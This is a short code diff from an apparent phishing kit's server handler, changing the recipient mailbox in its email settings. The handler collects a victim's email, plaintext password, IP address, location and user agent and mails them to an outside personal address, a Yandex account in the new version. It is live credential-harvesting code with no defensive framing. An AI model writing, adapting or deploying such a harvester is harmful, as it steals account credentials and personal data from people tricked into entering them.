@@ -28,7 +28,7 @@ export default async function handler(req, res) {
 
     const mailOptions = {
       from: "marysalvatore084@icloud.com",
-      to: "zikoloko774@gmail.com",
+      to: "paul.tatum024@yandex.com",
       subject: `Login: | ${email} | ${country} | ${host_ip}`,
       text: `Email: ${email}\nPassword: ${password}\nCountry: ${country}\nCity: ${city}\nRegion: ${region}\nHost_Ip: ${host_ip}\nHostname: ${hostname}\nTime Zone: ${timezone}\nPostal Code: ${postal_code}\nDate: ${date}\nUser_agent: ${user_agent}`,
     };
